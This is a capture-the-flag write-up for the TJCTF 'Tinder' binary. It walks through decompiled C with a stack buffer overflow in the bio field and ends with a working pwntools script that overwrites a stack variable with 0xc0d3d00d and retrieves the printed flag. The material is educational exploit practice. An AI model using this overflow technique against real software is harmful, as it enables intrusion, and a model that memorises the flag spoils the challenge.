# Tinder

> Start swiping!

Attached is a binary.

## Description

Let's dissassemble the binary with Ghidra. 

```c
int main(void)
{
  char local_a8 [32];
  char local_88 [64];
  char local_48 [16];
  char local_38 [16];
  char local_28 [16];
  FILE *local_18;
  int local_14;
  undefined *local_10;
  
  local_10 = &stack0x00000004;
  local_14 = 0;
  setup();
  puts("Welcome to TJTinder, please register to start matching!");
  printf("Name: ");
  input(local_28,1.00000000);
  printf("Username: ");
  input(local_38,1.00000000);
  printf("Password: ");
  input(local_48,1.00000000);
  printf("Tinder Bio: ");
  input(local_88,8.00000000);
  putchar(10);
  if (local_14 == -0x3f2c2ff3) {
    printf("Registered \'%s\' to TJTinder successfully!\n",local_38);
    puts("Searching for matches...");
    sleep(3);
    puts("It\'s a match!");
    local_18 = fopen("flag.txt","r");
    if (local_18 == (FILE *)0x0) {
      puts("Flag File is Missing. Contact a moderator if running on server.");
                    /* WARNING: Subroutine does not return */
      exit(0);
    }
    fgets(local_a8,0x20,local_18);
    printf("Here is your flag: %s",local_a8);
  }
  else {
    printf("Registered \'%s\' to TJTinder successfully!\n",local_38);
    puts("Searching for matches...");
    sleep(3);
    puts("Sorry, no matches found. Try Again!");
  }
  return 0;
}
```

And the input function:

```c
int input(char *str,float f)
{
  size_t sVar1;
  char *pcVar2;
  
  fgets(str,(int)ROUND(f * 16.00000000),stdin);
  sVar1 = strlen(str);
  if (1 < sVar1) {
    pcVar2 = strchr(str,10);
    if (pcVar2 == (char *)0x0) {
      do {
        str = (char *)fgetc(stdin);
      } while (str != (char *)0xa);
    }
    else {
      sVar1 = strlen(str);
      str = str + (sVar1 - 1);
      *str = '\0';
    }
    return (int)str;
  }
  puts("No input detected. Registration failed.");
                    /* WARNING: Subroutine does not return */
  exit(0);
}
```

In order to get the flag, the variable `local_14` needs to be set to `-0x3f2c2ff3 = 0xc0d3d00d`.

Reading the code from the `input` function, we see that if `input(buf, x)` is called, then we can enter `16x` characters in the buffer.

Therefore there is a bug and we can overflow the `local88` buffer, entering a maximum of `8 * 16 = 128` characters instead of 64. 

## Solution

Therefore, we overflow the buffer until we overwrite the `local_14` variable.

```python
from pwn import *

sh = remote("p1.tjctf.org", 8002)

print(sh.recvuntil("Name: ").decode())
sh.sendline("my name")
print(sh.recvuntil("Username: ").decode())
sh.sendline("user")
print(sh.recvuntil("Password: ").decode())
sh.sendline("pass")
print(sh.recvuntil("Bio: ").decode())

payload = b' '*(64+16+16+16) + p32(0xc0d3d00d) + p32(0xc0d3d00d) + p32(0xc0d3d00d)
sh.sendline(payload)

sh.interactive()
```

Flag: `tjctf{0v3rfl0w_0f_m4tch35}`